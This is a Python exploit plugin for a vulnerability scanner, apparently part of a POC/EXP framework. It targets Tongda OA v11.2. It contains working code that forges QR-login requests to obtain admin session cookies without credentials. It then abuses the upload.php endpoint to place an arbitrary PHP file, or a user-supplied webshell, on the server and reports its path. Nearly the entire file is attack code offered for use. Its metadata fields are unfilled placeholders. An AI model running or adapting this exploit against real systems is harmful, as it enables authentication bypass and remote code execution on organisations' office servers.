# -*- coding: UTF-8 -*-
#!/usr/bin/python
import requests
import re
import sys
from random import choice
import argparse
import json

def vuln_info():
    info={
        'vuln_name': '通达OA v11.2 upload.php文件上传',  #漏洞名称
        'vuln_referer':'未知',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'test',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''漏洞描述''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_class':'漏洞分类',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''修复建议。''',
        'FofaQuery_type':'socket', #socket、httpx
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="百度"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info

USER_AGENTS = [
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
]

headers={}


def getV11Session(url):
    checkUrl = url+'/general/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = str(res.text).split('{')
        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
        getSessUrl = url+'/logincheck_code.php'
        res = requests.post(
            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers,timeout=10,verify=False)
        tmp_cookie = res.headers['Set-Cookie']
        headers["User-Agent"] = choice(USER_AGENTS)
        headers["Cookie"] = tmp_cookie
        check_available = requests.get(url + '/general/index.php',headers=headers,timeout=10,verify=False)
        if '用户未登录' not in check_available.text:
            if '重新登录' not in check_available.text:
                return tmp_cookie
        else:
            return '获取Cookie失败1'
    except:
        return '获取Cookie失败1'



def get2017Session(url):
    checkUrl = url+'/ispirit/login_code.php'
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl,headers=headers)
        resText = json.loads(res.text)
        codeUid = resText['codeuid']
        codeScanUrl = url+'/general/login_code_scan.php'
        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers,timeout=10,verify=False)
        resText = json.loads(res.text)
        status = resText['status']
        if status == str(1):
            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
            res = requests.get(getCodeUidUrl)
            tmp_cookie = res.headers['Set-Cookie']
            headers["User-Agent"] = choice(USER_AGENTS)
            headers["Cookie"] = tmp_cookie
            check_available = requests.get(url + '/general/index.php',headers=headers,timeout=10,verify=False)
            if '用户未登录' not in check_available.text:
                if '重新登录' not in check_available.text:
                    return tmp_cookie

            else:
                return '获取cookie失败2'
        else:
            return '获取cookie失败2'
    except:
        return '获取cookie失败2'



def check(url):

    try:
        cookie1 = getV11Session(url)
        cookie2 = get2017Session(url)
        cookies = cookie1 + ";" + cookie2
        url1 = url + '/module/upload/upload.php?encode=utf-8'
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1","Cookie":cookies}
        data = {
            'id': 'WU_FILE_0',
            'name': 'shell.jpg',
            'type': 'image/jpeg',
            'lastModifiedDate': '2020/8/5',
            'size': '650'
        }
        files = {
            'file': ('test.php.',"11111" , 'application/octet-stream')
        }
        result = requests.post(url1, headers=headers, data=data,files=files,timeout=10,verify=False)
        if "id" in result.text:
            return result.text
    except:
        pass



def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        # 返回参数
        #Result返回是否存在，
        #Result_Info为返回的信息，可以为Paylaod
        #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
        #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"payload"}
        status = check(url)
        if status:
            result['Result'] =True
            result['Result_Info'] = "/module/upload/upload.php?encode=utf-8"
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')




def getmidstring(html, start_str, end):
    start = html.find(start_str)
    if start >= 0:
        start += len(start_str)
        end = html.find(end, start)
        if end >= 0:
            return html[start:end].strip()



def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        result = {"Result":False,"Result_Info":"payload"}
        if exp_data['type']=='uploadfile':
            cookie1 = getV11Session(url)
            cookie2 = get2017Session(url)
            cookies = cookie1 + ";" + cookie2
            url1 = url + '/module/upload/upload.php?encode=utf-8'
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1","Cookie":cookies}
            data = {
                'id': 'WU_FILE_0',
                'name': 'shell.jpg',
                'type': 'image/jpeg',
                'lastModifiedDate': '2020/8/5',
                'size': '650'
            }
            files = {
                'file': (exp_data['filename']+'.',exp_data['filename_contents'] , 'application/octet-stream')
            }
            result2 = requests.post(url1, headers=headers, data=data,files=files,timeout=10,verify=False)
            if "id" in result2.text:
                path = getmidstring(result2.text,"2205_",',",')
                status = requests.get(url + "/upload_temp/2205/"+path+"."+exp_data['filename'],timeout=10,verify=False)
                if status.status_code ==200:
                    result['Result'] = True
                    result['Result_Info'] = "上传成功\n路径为:" + url + "/upload_temp/2205/"+path+"."+exp_data['filename']
        return result
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')


